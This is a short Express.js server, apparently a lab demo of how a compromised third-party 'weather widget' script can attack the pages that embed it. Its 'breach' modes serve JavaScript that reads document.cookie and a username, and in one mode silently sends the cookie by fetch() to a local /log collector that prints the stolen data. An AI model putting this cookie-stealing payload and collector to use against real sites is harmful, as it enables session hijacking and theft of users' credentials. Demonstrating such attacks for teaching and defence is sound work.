const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());

const modeArg = process.argv.find(a => a.startsWith('--mode'));
const mode = modeArg
  ? (modeArg.includes('=') ? modeArg.split('=')[1] : process.argv[process.argv.indexOf(modeArg) + 1])
  : 'normal';

console.log(`WeatherApp starting in mode: ${mode}`);

app.get('/log', (req, res) => {
  console.log('');
  console.log('══════════════════════════════════════');
  console.log('  ⚠️  STOLEN DATA RECEIVED:');
  console.log('  ' + decodeURIComponent(req.query.data || ''));
  console.log('══════════════════════════════════════');
  console.log('');
  res.sendStatus(200);
});

app.get('/weather.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  if (mode === 'breach1') {
    res.send(`
      alert("HACKED: I can see your cookies: " + document.cookie +
            " and User: " + document.getElementById('username').innerText);
    `);
  } else if (mode === 'breach2') {
    res.send(`
      const stolenCookie = document.cookie;
      fetch('http://localhost:8002/log?data=' + encodeURIComponent(stolenCookie));
      console.log('[Attacker] Cookie silently sent to attacker server!');
    `);
  } else {
    res.send(`console.log("Weather widget: Temperature is 22°C");`);
  }
});

app.listen(8002, () => {
  console.log('WeatherApp running on http://localhost:8002');
});